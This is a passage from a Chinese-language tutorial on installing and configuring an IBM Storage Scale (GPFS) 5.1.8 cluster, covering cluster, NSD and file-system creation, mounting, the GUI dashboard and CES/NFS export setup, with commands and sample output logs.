Storage_Scale_Data_Access-5.1.8<br>├── tools<br>├── zimon_debs<br>└── zimon_rpms<br><br>16 directories, 3 files<br></code></pre></td></tr></table></figure><h2 id="3-2、修改环境变量"><a href="#3-2、修改环境变量" class="headerlink" title="3.2、修改环境变量"></a>3.2、修改环境变量</h2><p>为了后续方便使用 gpfs 的相关命令，我们可以把 gpfs bin 目录添加到 PATH 路径中。</p><p><strong>相关命令:</strong> （以下操作需要在每个 server 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置 gpfs bin PATH 路径</span><br><span class="hljs-built_in">cat</span> /root/.bash_profile<br>vi /root/.bash_profile<br><span class="hljs-comment"># .bash_profile</span><br><br><span class="hljs-comment"># Get the aliases and functions</span><br><span class="hljs-keyword">if</span> [ -f ~/.bashrc ]; <span class="hljs-keyword">then</span><br>        . ~/.bashrc<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># User specific environment and startup programs</span><br>PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/bin:/usr/lpp/mmfs/bin<br><span class="hljs-built_in">export</span> PATH<br></code></pre></td></tr></table></figure><h2 id="3-3、构建GPFS可移植层"><a href="#3-3、构建GPFS可移植层" class="headerlink" title="3.3、构建GPFS可移植层"></a>3.3、构建GPFS可移植层</h2><p>GPFS 可移植性层特定于当前内核和 GPFS 版本。如果内核或 GPFS 版本发生变化，则需要构建新的 GPFS 可移植层。尽管操作系统内核可能会升级到新版本，但它们在重新启动后才处于活动状态。因此，必须在重新启动操作系统后为这个新内核构建一个 GPFS 可移植层。<br>并且注意在安装新的 GPFS 可移植层之前，请确保先卸载先前版本的 GPFS 可移植层。</p><p>构建完成后，终端会输出生成的包的位置，然后，我们可以将生成的包复制到其他机器进行部署。默认情况下，生成的包只能部署到架构、分发级别、Linux 内核和 IBM Spectrum Scale 维护级别与构建 gpfs.gplbin 包的机器相同的机器上。不过仍然建议在每个 server 节点上执行构建操作生成本机的 GPFS 可移植层。</p><p><strong>相关命令:</strong> （以下操作需要在每个 server 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建 gpfs 可移植层，</span><br>mmbuildgpl --build-package<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmbuildgpl --build-package<br>--------------------------------------------------------<br>mmbuildgpl: Building GPL (5.1.8.1) module begins at Thu Jun 19 21:40:45 CST 2024.<br>--------------------------------------------------------<br>Verifying Kernel Header...<br>  kernel version = 41800348 (418000348000000, 4.18.0-348.el8.x86_64, 4.18.0-348)<br>  module include <span class="hljs-built_in">dir</span> = /lib/modules/4.18.0-348.el8.x86_64/build/include<br>  module build <span class="hljs-built_in">dir</span>   = /lib/modules/4.18.0-348.el8.x86_64/build<br>  kernel <span class="hljs-built_in">source</span> <span class="hljs-built_in">dir</span>  = /usr/src/linux-4.18.0-348.el8.x86_64/include<br>  Found valid kernel header file under /usr/src/kernels/4.18.0-348.el8.x86_64/include<br>Getting Kernel Cipher mode...<br>   Will use skcipher routines<br>Verifying Compiler...<br>  make is present at /bin/make<br>  cpp is present at /bin/cpp<br>  gcc is present at /bin/gcc<br>  g++ is present at /bin/g++<br>  ld is present at /bin/ld<br>Verifying rpmbuild...<br>Verifying libelf devel package...<br>  Verifying  elfutils-libelf-devel is installed ...<br>    Command: /bin/rpm -q  elfutils-libelf-devel<br>    The required package  elfutils-libelf-devel is installed<br>Verifying Additional System Headers...<br>  Verifying kernel-headers is installed ...<br>    Command: /bin/rpm -q kernel-headers<br>    The required package kernel-headers is installed<br>make World ...<br>make InstallImages ...<br>make rpm ...<br>Wrote: /root/rpmbuild/RPMS/x86_64/gpfs.gplbin-4.18.0-348.el8.x86_64-5.1.8-1.x86_64.rpm<br>--------------------------------------------------------<br>mmbuildgpl: Building GPL module completed successfully at Thu Jun 19 21:41:13 CST 2024.<br>--------------------------------------------------------<br></code></pre></td></tr></table></figure><h2 id="3-4、创建集群"><a href="#3-4、创建集群" class="headerlink" title="3.4、创建集群"></a>3.4、创建集群</h2><p>GPFS 的仲裁机制和 ZooKeeper 的仲裁机制类似，当有一半以上的节点是 quorum 时，集群才可以启动，即： <code>quorum &gt;= 1 + sizeof(all nodes) / 2</code> 。</p><p><strong>相关命令:</strong> （以下操作仅在 node01 节点上执行即可）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 nodefile 文件</span><br><span class="hljs-built_in">cat</span> /etc/mmfs/nodefile<br>node01:quorum-manager:<br>node02:quorum-manager:<br>node03:quorum-manager:<br><br><br><span class="hljs-comment"># 创建集群</span><br>mmcrcluster -N /etc/mmfs/nodefile -C gpfscluster -r /usr/bin/ssh -R /usr/bin/scp -A<br><br><span class="hljs-comment"># 接受节点许可证</span><br>mmchlicense server --accept -N all<br><br><span class="hljs-comment"># 启动集群节点</span><br>mmstartup -N node01<br>mmstartup -N node02<br>mmstartup -N node03<br></code></pre></td></tr></table></figure><p><strong>mmcrcluster 参数说明:</strong></p><ul><li><code>-N</code> : 表示节点的配置文件。</li><li><code>-C</code> : 指定集群的名称。</li><li><code>-r</code> : 指定 GPFS 使用的远程 shell 程序的完整路径名。默认值为 &#x2F;usr&#x2F;bin&#x2F;ssh。</li><li><code>-R</code> : 指定 GPFS 使用的远程文件复制程序的完整路径名。默认值为 &#x2F;usr&#x2F;bin&#x2F;scp。</li><li><code>-A</code> : 指定当节点启动时 GPFS 守护进程自动启动。默认情况下不自动启动守护进程。</li></ul><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmcrcluster -N /etc/mmfs/nodefile -C gpfscluster -r /usr/bin/ssh -R /usr/bin/scp -A<br>mmcrcluster: Performing preliminary node verification ...<br>mmcrcluster: Processing quorum and other critical nodes ...<br>mmcrcluster: Finalizing the cluster data structures ...<br>mmcrcluster: Command successfully completed<br>mmcrcluster: Warning: Not all nodes have proper GPFS license designations.<br>    Use the mmchlicense <span class="hljs-built_in">command</span> to designate licenses as needed.<br>mmcrcluster: [I] The cluster was created with the tscCmdAllowRemoteConnections configuration parameter <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;no&quot;</span>. If a remote cluster is established with another cluster whose release level (minReleaseLevel) is less than 5.1.3.0, change the value of tscCmdAllowRemoteConnections <span class="hljs-keyword">in</span> this cluster to <span class="hljs-string">&quot;yes&quot;</span>.<br>mmcrcluster: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node01 data]# mmchlicense server --accept -N all<br><br>The following nodes will be designated as possessing server licenses:<br>        node01<br>        node02<br>        node03<br>mmchlicense: Command successfully completed<br>mmchlicense: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node01 data]# mmstartup -N node01<br>Fri Jun 20 10:29:53 CST 2024: mmstartup: Starting GPFS ...<br>[root@node02 data]# mmstartup -N node02<br>Fri Jun 20 10:29:55 CST 2024: mmstartup: Starting GPFS ...<br>[root@node03 data]# mmstartup -N node03<br>Fri Jun 20 10:29:58 CST 2024: mmstartup: Starting GPFS ...<br></code></pre></td></tr></table></figure><h2 id="3-5、创建NSD"><a href="#3-5、创建NSD" class="headerlink" title="3.5、创建NSD"></a>3.5、创建NSD</h2><p><strong>&#x2F;etc&#x2F;mmfs&#x2F;nsdfile 配置文件内容:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">%nsd: device=/dev/sdc<br>  nsd=data01<br>  servers=node01<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br>%nsd: device=/dev/sdd<br>  nsd=data02<br>  servers=node01<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br>%nsd: device=/dev/sdc<br>  nsd=data03<br>  servers=node02<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br>%nsd: device=/dev/sdd<br>  nsd=data04<br>  servers=node02<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br>%nsd: device=/dev/sdc<br>  nsd=data05<br>  servers=node03<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br>%nsd: device=/dev/sdd<br>  nsd=data06<br>  servers=node03<br>  usage=dataAndMetadata<br>  failureGroup=-1<br>  pool=system<br>  thinDiskType=auto<br></code></pre></td></tr></table></figure><p><strong>配置文件参数解析:</strong></p><ul><li><code>device</code> : 块设备名称，用于定义为 NSD 的磁盘。</li><li><code>nsd</code> : 指定要创建的 NSD 的名称。不能以保留字符串 ‘gpfs’ 开头。</li><li><code>servers</code> : 指定一个以逗号分隔的 NSD 服务器节点列表。</li><li><code>usage</code> : 指定要存储在磁盘上的数据类型。<ul><li>dataAndMetadata : 表示磁盘包含数据和元数据。默认配置。</li><li>dataOnly : 表示磁盘仅包含数据，不包含元数据。</li><li>metadataOnly : 表示磁盘仅包含元数据，不包含数据。</li><li>descOnly : 表示磁盘不包含数据和文件元数据。仅用于保存文件系统描述符的副本，并可用作某些灾难恢复配置中的第三故障组。</li><li>localCache : 表示磁盘将用作本地只读缓存设备。</li></ul></li><li><code>failureGroup</code> : 标识磁盘所属的故障组。默认值为 -1，表示该磁盘与其他任何磁盘没有共同的故障点。</li><li><code>pool</code> : 指定 NSD 所分配的存储池的名称。默认值为 system 。</li><li><code>thinDiskType</code> : 指定空间回收磁盘类型。<ul><li>no : 磁盘设备支持空间回收。此值为默认值。</li><li>nvme :  磁盘是支持 TRIM 的 NVMe 设备，支持 mmreclaimspace 命令。</li><li>scsi : 磁盘是薄配置的 SCSI 磁盘，支持 mmreclaimspace 命令。</li><li>auto : 磁盘类型为 nvme 或 scsi。IBM Storage Scale 将尝试自动检测实际磁盘类型。</li></ul></li></ul><p><strong>相关命令:</strong> （以下操作仅在 node01 上执行即可）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 nsd</span><br>mmcrnsd -F /etc/mmfs/nsdfile<br><br><span class="hljs-comment"># 查看 nsd</span><br>mmlsnsd -m<br><br><span class="hljs-comment"># 启动集群</span><br>mmstartup -a<br><br><span class="hljs-comment"># 查看集群状态</span><br>mmgetstate -Las<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmcrnsd -F /etc/mmfs/nsdfile<br>mmcrnsd: Processing disk sdc<br>mmcrnsd: Processing disk sdd<br>mmcrnsd: Processing disk sdc<br>mmcrnsd: Processing disk sdd<br>mmcrnsd: Processing disk sdc<br>mmcrnsd: Processing disk sdd<br>mmcrnsd: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node01 data]# mmlsnsd -m<br><br> Disk name       NSD volume ID      Device          Node name or Class       Remarks<br>-------------------------------------------------------------------------------------------<br> data01          0A321B396854D5C1   /dev/sdc        node01                   server node<br> data02          0A321B396854D5C2   /dev/sdd        node01                   server node<br> data03          0A321B3A6854D5C3   /dev/sdc        node02                   server node<br> data04          0A321B3A6854D5C4   /dev/sdd        node02                   server node<br> data05          0A321B3B6854D5C5   /dev/sdc        node03                   server node<br> data06          0A321B3B6854D5C6   /dev/sdd        node03                   server node<br><br><br>[root@node01 data]# mmstartup -a<br>Fri Jun 20 10:34:58 CST 2024: mmstartup: Starting GPFS ...<br>node01:  The GPFS subsystem is already active.<br>node02:  The GPFS subsystem is already active.<br>node03:  The GPFS subsystem is already active.<br><br><br>[root@node01 data]# mmgetstate -Las<br><br> Node number  Node name  Quorum  Nodes up  Total nodes  GPFS state    Remarks<br>---------------------------------------------------------------------------------<br>           1  node01        2         3          3      active        quorum node<br>           2  node02        2         3          3      active        quorum node<br>           3  node03        2         3          3      active        quorum node<br><br> Summary information<br>---------------------<br>Number of nodes defined <span class="hljs-keyword">in</span> the cluster:            3<br>Number of <span class="hljs-built_in">local</span> nodes active <span class="hljs-keyword">in</span> the cluster:       3<br>Number of remote nodes joined <span class="hljs-keyword">in</span> this cluster:     0<br>Number of quorum nodes defined <span class="hljs-keyword">in</span> the cluster:     3<br>Number of quorum nodes active <span class="hljs-keyword">in</span> the cluster:      3<br>Quorum = 2, Quorum achieved<br></code></pre></td></tr></table></figure><h2 id="3-6、创建文件系统"><a href="#3-6、创建文件系统" class="headerlink" title="3.6、创建文件系统"></a>3.6、创建文件系统</h2><p><strong>相关命令:</strong> （以下操作仅在 node01 上执行即可）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建文件系统</span><br>mmcrfs defaultfs \<br>       -F /etc/mmfs/nsdfile \<br>       -A <span class="hljs-built_in">yes</span> \<br>       -B 4M \<br>       -j scatter \<br>       -m 2 \<br>       -r 2 \<br>       -M 2 \<br>       -R 2 \<br>       -T /gpfsdata<br><br><span class="hljs-comment"># 查看文件系统</span><br>mmlsfs all<br></code></pre></td></tr></table></figure><p><strong>参数解释:</strong> （详细参数解释参见 <a href="https://www.ibm.com/docs/en/storage-scale/5.1.8?topic=reference-mmcrfs-command">5.1.8&#x2F;mmcrfs</a> ）</p><ul><li><code>Device</code> : 指定文件系统名称。</li><li><code>-F</code> : 指定一个包含要添加到文件系统的磁盘的 NSD 节和池节的文件。</li><li><code>-A</code> : 指示文件系统何时挂载，当指定为 yes 时代表GPFS 守护进程启动时挂载。（默认为 yes ）</li><li><code>-B</code> : 指定文件系统中数据块的大小。</li><li><code>-j</code> : 指定默认的块分配映射类型。支持 cluster&#x2F;scatter 两种类型。</li><li><code>-m</code> : 指定文件的 inode、目录和间接块的默认副本数量。可选值为 1&#x2F;2&#x2F;3 。此值不能大于 MaxMetadataReplicas 的值。默认值为 1。</li><li><code>-r</code> : 指定文件的每个数据块的默认副本数量。可选值为 1&#x2F;2&#x2F;3 。此值不能大于 MaxDataReplicas 的值。默认值为 1。</li><li><code>-M</code> : 指定文件的 inode、目录和间接块的默认最大副本数量。可选值为 1&#x2F;2&#x2F;3 。此值不能小于 DefaultMetadataReplicas 的值。默认值为 2。</li><li><code>-R</code> : 指定文件的数据块的默认最大副本数量。可选值为 1&#x2F;2&#x2F;3 。此值不能小于 DefaultDataReplicas 的值。默认值为 2。</li><li><code>-T</code> : 指定 GPFS 文件系统的挂载点目录。如果未指定，挂载点将设置为 DefaultMountDir&#x2F;Device 。 DefaultMountDir 的默认值为 &#x2F;gpfs，但可以使用 mmchconfig 命令进行更改。</li></ul><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmcrfs defaultfs \<br>&gt;        -F /etc/mmfs/nsdfile \<br>&gt;        -A <span class="hljs-built_in">yes</span> \<br>&gt;        -B 4M \<br>&gt;        -j scatter \<br>&gt;        -m 2 \<br>&gt;        -r 2 \<br>&gt;        -M 2 \<br>&gt;        -R 2 \<br>&gt;        -T /gpfsdata<br><br>The following disks of defaultfs will be formatted on node node01:<br>    data01: size 102400 MB<br>    data02: size 102400 MB<br>    data03: size 102400 MB<br>    data04: size 102400 MB<br>    data05: size 102400 MB<br>    data06: size 102400 MB<br>Formatting file system ...<br>Disks up to size 1.56 TB can be added to storage pool system.<br>Creating Inode File<br>  31 % complete on Fri Jun 20 10:49:07 2024<br>  46 % complete on Fri Jun 20 10:49:12 2024<br>  74 % complete on Fri Jun 20 10:49:17 2024<br> 100 % complete on Fri Jun 20 10:49:21 2024<br>Creating Allocation Maps<br>Creating Log Files<br>Clearing Inode Allocation Map<br>Clearing Block Allocation Map<br>Formatting Allocation Map <span class="hljs-keyword">for</span> storage pool system<br>Completed creation of file system /dev/defaultfs.<br>mmcrfs: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node01 data]# mmlsfs all<br><br>File system attributes <span class="hljs-keyword">for</span> /dev/defaultfs:<br>==========================================<br>flag                value                    description<br>------------------- ------------------------ -----------------------------------<br> -f                 8192                     Minimum fragment (subblock) size <span class="hljs-keyword">in</span> bytes<br> -i                 4096                     Inode size <span class="hljs-keyword">in</span> bytes<br> -I                 32768                    Indirect block size <span class="hljs-keyword">in</span> bytes<br> -m                 2                        Default number of metadata replicas<br> -M                 2                        Maximum number of metadata replicas<br> -r                 2                        Default number of data replicas<br> -R                 2                        Maximum number of data replicas<br> -j                 scatter                  Block allocation <span class="hljs-built_in">type</span><br> -D                 nfs4                     File locking semantics <span class="hljs-keyword">in</span> effect<br> -k                 all                      ACL semantics <span class="hljs-keyword">in</span> effect<br> -n                 32                       Estimated number of nodes that will mount file system<br> -B                 4194304                  Block size<br> -Q                 none                     Quotas accounting enabled<br>                    none                     Quotas enforced<br>                    none                     Default quotas enabled<br> --perfileset-quota no                       Per-fileset quota enforcement<br> --filesetdf        no                       Fileset <span class="hljs-built_in">df</span> enabled?<br> -V                 31.00 (5.1.7.0)          File system version<br> --create-time      Fri Jun 20 11:32:26 2024 File system creation <span class="hljs-keyword">time</span><br> -z                 no                       Is DMAPI enabled?<br> -L                 33554432                 Logfile size<br> -E                 <span class="hljs-built_in">yes</span>                      Exact mtime mount option<br> -S                 relatime                 Suppress atime mount option<br> -K                 whenpossible             Strict replica allocation option<br> --fastea           <span class="hljs-built_in">yes</span>                      Fast external attributes enabled?<br> --encryption       no                       Encryption enabled?<br> --inode-limit      615424                   Maximum number of inodes<br> --uid              3B1B320A:6854D64A        File system UID<br> --log-replicas     0                        Number of <span class="hljs-built_in">log</span> replicas<br> --is4KAligned      <span class="hljs-built_in">yes</span>                      is4KAligned?<br> --rapid-repair     <span class="hljs-built_in">yes</span>                      rapidRepair enabled?<br> --write-cache-threshold 0                   HAWC Threshold (max 65536)<br> --subblocks-per-full-block 512              Number of subblocks per full block<br> -P                 system                   Disk storage pools <span class="hljs-keyword">in</span> file system<br> --file-audit-log   no                       File Audit Logging enabled?<br> --maintenance-mode no                       Maintenance Mode enabled?<br> --flush-on-close   no                       flush cache on file close enabled?<br> --auto-inode-limit no                       Increase maximum number of inodes per inode space automatically?<br> --nfs4-owner-write-acl <span class="hljs-built_in">yes</span>                  NFSv4 implicit owner WRITE_ACL permission enabled?<br> -d                 data01;data02;data03;data04;data05;data06  Disks <span class="hljs-keyword">in</span> file system<br> -A                 <span class="hljs-built_in">yes</span>                      Automatic mount option<br> -o                 none                     Additional mount options<br> -T                 /gpfsdata                Default mount point<br> --mount-priority   0                        Mount priority<br></code></pre></td></tr></table></figure><h2 id="3-7、挂载文件系统"><a href="#3-7、挂载文件系统" class="headerlink" title="3.7、挂载文件系统"></a>3.7、挂载文件系统</h2><p>该方式用于在 server 节点上挂载测试文件系统。如果需要在其他客户端上挂载测试文件系统，建议查看第四栏目中的集群运维操作。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载文件系统</span><br><span class="hljs-comment"># 所有 server 上均挂载，执行时间可能会长一些</span><br>mmmount defaultfs /gpfsdata -N all<br><br><span class="hljs-comment"># 查看挂载点信息</span><br><span class="hljs-built_in">df</span> -hT<br><br><span class="hljs-comment"># 访问文件系统目录</span><br><span class="hljs-built_in">ls</span> -al /gpfsdata<br><br><span class="hljs-comment"># 取消挂载</span><br>mmumount /gpfsdata<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmmount defaultfs /gpfsdata -N all<br>Fri Jun 20 11:34:12 CST 2024: mmmount: Mounting file systems ...<br><br><br>[root@node01 data]# <span class="hljs-built_in">df</span> -hT /gpfsdata<br>Filesystem     Type  Size  Used Avail Use% Mounted on<br>defaultfs      gpfs  600G  6.5G  594G   2% /gpfsdata<br></code></pre></td></tr></table></figure><h2 id="3-8、配置Dashboard"><a href="#3-8、配置Dashboard" class="headerlink" title="3.8、配置Dashboard"></a>3.8、配置Dashboard</h2><p>该步骤用于配置 GPFS GUI ， 即 GPFS 的 Dashboard Web UI ，可用于从界面管控集群。 </p><p><strong>相关命令:</strong> （在期望运行 Dashboard 的节点上执行，这里选择 node01 和 node02 两个节点）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装外部依赖软件包（在选择的每个节点执行）</span><br>dnf install -y postgresql-contrib postgresql-server<br><br><span class="hljs-comment"># 安装 gpfs 软件包（在选择的每个节点执行）</span><br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/zimon_rpms/rhel8/<br>rpm -ivh gpfs.gss.pmcollector-5.1.8-1.el8.x86_64.rpm<br>rpm -ivh gpfs.gss.pmsensors-5.1.8-1.el8.x86_64.rpm<br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/gpfs_rpms/<br>rpm -ivh gpfs.java-5.1.8-1.x86_64.rpm<br>rpm -ivh gpfs.gui-5.1.8-1.noarch.rpm<br><br><span class="hljs-comment"># 初始化收集器节点（在其中一个节点执行即可）</span><br>mmperfmon config generate --collectors node01,node02<br><br><span class="hljs-comment"># 设置传感器节点，即监控数据采集的来源节点（在其中一个节点执行即可）</span><br>mmchnode --perfmon -N node01,node02,node03<br><br><span class="hljs-comment"># 启动 gui dashboard 组件（在选择的每个节点执行）</span><br>systemctl start gpfsgui<br>systemctl <span class="hljs-built_in">enable</span> gpfsgui<br><br><span class="hljs-comment"># 创建 gui 用户，根据提示输出密码（在其中一个节点执行即可）</span><br>/usr/lpp/mmfs/gui/cli/mkuser admin -g SecurityAdmin<br><br><span class="hljs-comment"># 访问 web ui ，对应为 node01 或 node02 的地址</span><br>https://10.10.0.1<br>https://10.10.0.2<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# mmperfmon config generate --collectors node01,node02<br>mmperfmon: Node node02 is not a perfmon node.<br>mmperfmon: Node node01 is not a perfmon node.<br>mmperfmon: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node01 data]# mmchnode --perfmon -N node01,node02,node03<br>Fri Jun 20 13:59:26 CST 2024: mmchnode: Processing node node03<br>Fri Jun 20 13:59:26 CST 2024: mmchnode: Processing node node02<br>Fri Jun 20 13:59:26 CST 2024: mmchnode: Processing node node01<br>mmchnode: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br></code></pre></td></tr></table></figure><h2 id="3-9、配置CES"><a href="#3-9、配置CES" class="headerlink" title="3.9、配置CES"></a>3.9、配置CES</h2><p>GPFS 的 CES 节点用于支持 NFS 访问，提供通用的 NFS 访问方式。</p><p>GPFS 提供两种高可用 NFS 服务的方式，分别是 <code>Cluster NFS (CNFS)</code> 和 <code>Cluster Export Services (CES)</code> ，二者互斥只能选其一。 </p><ul><li><code>Cluster NFS (CNFS)</code>: 只支持 NFS 。基于 Linux kernel 的 NFS server ， NFS 的配置不由 GPFS 管理，元数据性能较好。</li><li><code>Cluster Export Services (CES)</code>: 支持 NFS&#x2F;SMB&#x2F;Object 。基于用户空间的 Ganesha NFS server ， GPFS 管理 NFS 配置，数据流式访问性能好。</li></ul><p>我们在 node02 和 node03 上部署 CES 服务。</p><table><thead><tr><th align="center">节点名称</th><th align="center">节点IP</th><th align="center">VIP</th></tr></thead><tbody><tr><td align="center">node02</td><td align="center">10.10.0.2</td><td align="center">10.10.0.102</td></tr><tr><td align="center">node03</td><td align="center">10.10.0.3</td><td align="center">10.10.0.103</td></tr></tbody></table><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改所有 server 节点中 /etc/hosts ，添加虚拟 ip 映射</span><br><span class="hljs-built_in">cat</span> /etc/hosts<br>10.10.0.1 node01<br>10.10.0.2 node02<br>10.10.0.3 node03<br>10.10.0.101 node01<br>10.10.0.102 node02<br>10.10.0.103 node03<br><br><span class="hljs-comment"># 设置 ces 共享目录（在选择的任一节点上执行）</span><br>mmchconfig cesSharedRoot=/gpfsdata<br><br><span class="hljs-comment"># 重启需要部署 ces 服务的节点上的服务（在选择的每个节点上执行）</span><br>mmshutdown -N node02<br>mmstartup -N node02<br>mmshutdown -N node03<br>mmstartup -N node03<br><br><span class="hljs-comment"># 添加 ces 节点（在选择的任一节点上执行）</span><br>mmchnode --ces-enable -N node02,node03<br><br><span class="hljs-comment"># 检查虚拟 ip 的解析是否存在问题（在选择的任一节点上执行）</span><br>mmcmi host 10.10.0.102<br>mmcmi host 10.10.0.103<br><br><span class="hljs-comment"># 添加 ces 虚拟 ip ， ces 组件会在对应的网卡建立该虚拟 ip（在选择的任一节点上执行）</span><br>mmces address add --ces-ip 10.10.0.102,10.10.0.103<br><br><span class="hljs-comment"># 查看 ces ip（在选择的任一节点上执行）</span><br>mmces address list --full-list<br><br><span class="hljs-comment"># 查看 ces 节点上的虚拟 ip 绑定情况（在每个节点上执行）</span><br>ip a<br><br><span class="hljs-comment"># 查看集群 ces 节点（在选择的任一节点上执行）</span><br>mmlscluster --ces<br><br><span class="hljs-comment"># 安装 nfs-ganesha/smb 软件（在选择的每个节点上执行）</span><br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/ganesha_rpms/rhel8/<br>dnf remove -y nfs-ganesha<br>rpm -ivh gpfs.nfs-ganesha-debuginfo-3.5-ibm071.22.el8.x86_64.rpm<br>rpm -ivh gpfs.nfs-ganesha-3.5-ibm071.22.el8.x86_64.rpm<br>rpm -ivh gpfs.nfs-ganesha-gpfs-3.5-ibm071.22.el8.x86_64.rpm<br>rpm -ivh gpfs.nfs-ganesha-utils-3.5-ibm071.22.el8.x86_64.rpm<br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/smb_rpms/rhel8/<br>rpm -ivh gpfs.smb-4.17.5_gpfs_1-3.el8.x86_64.rpm<br>rpm -ivh gpfs.smb-debuginfo-4.17.5_gpfs_1-3.el8.x86_64.rpm<br><br><span class="hljs-comment"># 启动 nfs 服务（在选择的任一节点上执行）</span><br>mmces service <span class="hljs-built_in">enable</span> NFS<br><br><span class="hljs-comment"># 检查 nfs 状态</span><br>mmces service list -a<br><br><span class="hljs-comment"># 设置用户认证方式</span><br>mmuserauth service create --data-access-method file --<span class="hljs-built_in">type</span> userdefined<br><br><span class="hljs-comment"># 新增 nfs export</span><br><span class="hljs-built_in">mkdir</span> -p /gpfsdata/nfsexport01<br>mmnfs <span class="hljs-built_in">export</span> add /gpfsdata/nfsexport01 --client <span class="hljs-string">&quot;10.10.0.1(Access_Type=RW,Squash=no_root_squash)&quot;</span><br><br><span class="hljs-comment"># 客户端挂载 nfs export</span><br><span class="hljs-comment"># 可以使用 ces vip 的两个任意一个 vip 连接</span><br>mount -t nfs -o vers=4,ro 10.10.0.102:/gpfsdata/nfsexport01 /mnt/share<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node02 data]# mmchconfig cesSharedRoot=/gpfsdata<br>mmchconfig: Command successfully completed<br>mmchconfig: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node02 data]# mmchnode --ces-enable -N node02,node03<br>Fri Jun 20 15:49:12 CST 2024: mmchnode: Processing node node03<br>Fri Jun 20 15:49:19 CST 2024: mmchnode: Processing node node02<br>mmchnode: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br><br>[root@node02 data]# mmces address list --full-list<br>cesAddress     cesNode     attributes   cesGroup   cesPrefix   preferredNode   unhostableNodes<br>-------------- ----------- ------------ ---------- ----------- --------------- -----------------<br>10.10.0.102    node02      none         none       none        none            none<br>10.10.0.103    node03      none         none       none        none            none<br><br><br>[root@node02 data]# ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:85:34:ba brd ff:ff:ff:ff:ff:ff<br>    inet 10.10.0.2/24 brd 10.10.0.255 scope global noprefixroute ens0<br>       valid_lft forever preferred_lft forever<br>    inet 10.10.0.102/24 scope global secondary ens0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::250:56ff:fe85:34ba/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br><br><br>[root@node03 data]# ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:85:fb:43 brd 